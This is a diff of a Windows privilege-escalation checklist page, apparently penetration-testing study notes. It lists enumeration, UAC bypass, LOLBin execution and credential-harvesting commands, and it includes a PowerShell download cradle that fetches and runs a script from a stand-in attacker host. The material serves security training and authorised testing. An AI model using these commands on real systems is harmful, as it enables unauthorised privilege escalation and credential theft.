@@ -1,5 +1,6 @@
 +++
 title = 'Windows Privilege Escalation Checklist'
+description = 'Phase-by-phase Windows privilege escalation checklist: token privileges, service and registry misconfigurations, credentials and DPAPI, UAC bypass, tasks, and kernel fallbacks.'
 date = 2026-10-30
 type = 'notes'
 weight = 80
@@ -32,7 +33,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 ## Phase 0 — Orient (60 seconds)
 
 - [ ] `whoami /all` — user, groups, SID, **integrity level**
-- [ ] `whoami /priv` — **the single highest-value command**; an enabled `SeImpersonate`, `SeBackup`, or `SeDebug` is often an instant win[reference:1]
+- [ ] `whoami /priv` — **the single highest-value command**; an enabled `SeImpersonate`, `SeBackup`, or `SeDebug` is often an instant win
 - [ ] `whoami /groups | findstr /i "Mandatory"` — `Medium` + `Administrators` = **UAC is the only barrier**
 - [ ] `hostname; systeminfo` — OS build, patches, hotfixes
 - [ ] `net config workstation` — domain membership
@@ -45,7 +46,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 ## Phase 1 — Automated Triage (run once, verify by hand)
 
 - [ ] `winPEASx64.exe quiet` — broad enumeration; focus on **red + yellow** findings
-- [ ] `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"`[reference:2]
+- [ ] `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"`
 - [ ] `SharpUp.exe audit` — C# equivalent; separates **service binary** and **service DACL** findings
 - [ ] `Seatbelt.exe -group=all` — host survey
 - [ ] **Verify every hit by hand** — automated tools produce false positives
@@ -106,6 +107,18 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 - [ ] `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
 - [ ] **Both** must be `0x1` → `msiexec /quiet /qn /i shell.msi`
 
+**Print spooler and driver load**
+
+- [ ] `Get-Service Spooler` / `sc query spooler` — running on a member server is a PrintNightmare / driver-loading surface (CVE-2021-34527 / CVE-2021-1675)
+- [ ] `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"` — `RestrictDriverInstallationToAdministrators` absent or `0` reopens it
+- [ ] `Get-PrinterDriver` — already-installed packages are the quieter path; user-writable driver paths double as DLL hijacks
+
+**Execution policy and AppLocker**
+
+- [ ] `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`; `$ExecutionContext.SessionState.LanguageMode` — `ConstrainedLanguage` blocks most PowerShell tooling
+- [ ] CLM bypass: `PSByPassCLM` runspace, or switch to a signed binary that ignores the policy (MSBuild / InstallUtil below)
+- [ ] `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj` / `InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll` — LOLBins that still execute when PowerShell is constrained
+
 ---
 
 ## Phase 4 — Credentials (often the fastest lateral / root path)
@@ -148,6 +161,10 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 - [ ] KeePass `.kdbx` → `keepass2john` + `hashcat -m 13400`
 - [ ] Sticky Notes: `...\Microsoft.MicrosoftStickyNotes_...\LocalState\plum.sqlite`
 - [ ] Alternate data streams: `dir /R` → `Get-Content -Stream` or `more < file.txt:secret`
+- [ ] `wsl -l -v`; `cat /root/.bash_history` inside a WSL distro — a DISTRO shell with Windows drives mounted, often with saved SSH keys
+- [ ] OneDrive: `dir /S /B %USERPROFILE%\OneDrive\*.kdbx *.pfx *.ovpn *.rdp` — sync folders leak credentials off-box
+- [ ] WinSCP: `reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` — stored host/user, then decrypt with `winscppasswd`
+- [ ] `Get-MpPreference | select ExclusionPath,ExclusionProcess` — Defender exclusions are both a signal and a staging path
 
 ---
 
@@ -181,6 +198,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 - [ ] **FODHelper / ComputerDefaults** — `HKCU\Software\Classes\ms-settings\Shell\Open\command`
 - [ ] **EventVWR** — `HKCU\Software\Classes\mscfile\shell\open\command`
 - [ ] **ICMLuaUtil COM** (CMSTPLUA) — the dominant 2025–2026 technique; no registry artifact
+- [ ] **Parent-process spoofing:** `sdclt.exe /K` or `WmiPrvSE.exe` as the auto-elevating parent, then inject into the elevated child
 - [ ] **Check Administrator Protection status** on Windows 11 25H2+ (currently disabled by default)
 - [ ] Clean up the registry key after the payload fires
 
@@ -206,6 +224,8 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 - [ ] **LAPS:** `ReadProperty` on `ms-Mcs-AdmPwd` / `msLAPS-Password` → local admin password
 - [ ] **WSUS:** `reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer` → SharpWSUS
 - [ ] **GPP `cpassword`:** SYSVOL `Groups.xml` → `gpp-decrypt`
+- [ ] **gMSA:** `Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword` (needs read rights) → derive the password offline with GoldenGMSA
+- [ ] **Toolkit:** PowerView (`Get-DomainObjectAcl`, `Find-InterestingDomainAcl`), Rubeus (`kerberoast`, `asreproast`, `s4u`), Certipy/Certify (`find`, `req`, `auth`)
 
 ---
 
@@ -215,6 +235,23 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 - [ ] Two full passes with no lead → re-read `whoami /priv`, service DACLs, `cmdkey /list`, **process environments**, and **scheduled-task Action binaries** — these are the most-missed
 - [ ] If time-boxed and stuck → pivot to network enumeration; a lateral host may be easier
 - [ ] If kernel exploit is the only path left → confirm architecture, keep a fallback shell, and choose a deterministic bug over a race
+
+---
+
+## Cross-Reference — Where Each Phase Lives in the Notes
+
+| Phase | Note page |
+|---|---|
+| Phase 0 / 1 — Orient and automated triage | [Enumerating attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) |
+| Phase 2 — Token privileges | [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) |
+| Phase 3 — Services, registry and unquoted paths | [Unquoted service paths](/notes/windows-privilege-escalation/unquoted-service-paths/) · [File system ACLs](/notes/windows-privilege-escalation/file-system-acls/) |
+| Phase 4 — Credentials and DPAPI | [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/) |
+| Phase 5 — Sessions and privileged groups | [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/) |
+| Phase 7 — UAC | [UAC bypass](/notes/windows-privilege-escalation/user-account-control-uac-bypass/) |
+| Phase 9 — Domain and AD CS | [Active Directory checklist](/notes/active-directory/checklist/) |
+
+For the same technique described without a lab frame, use the [OSCP command checklist](/notes/oscp-labs/commands/).
+
 ---
 
 **A few notes on the 2025–2026 additions:**
